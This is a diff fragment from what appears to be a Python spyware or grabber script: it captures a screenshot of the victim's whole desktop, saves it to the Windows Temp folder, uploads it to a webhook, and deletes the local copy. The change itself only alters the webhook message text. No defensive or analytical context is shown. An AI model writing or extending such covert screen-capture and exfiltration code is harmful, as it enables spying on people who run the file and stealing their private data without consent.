@@ -108,7 +108,7 @@ screenshot = ImageGrab.grab(bbox=None,include_layered_windows=False,all_screens=
 screenshot.save(f'C:\\Users\\{u}\\AppData\\Local\\Temp\\sslol.png')
 screenshot.close()
 with open(f'C:\\Users\\{u}\\AppData\\Local\\Temp\\sslol.png', 'rb') as f:
-  requests.post(webhook,json={'content': f'Someone Ran The File:'})
+  requests.post(webhook,json={'content': f'Picture Of There DeskTop:'})
   requests.post(webhook,files={'upload_file': f})
   os.remove(f'C:\\Users\\{u}\\AppData\\Local\\Temp\\sslol.png')
 while True:
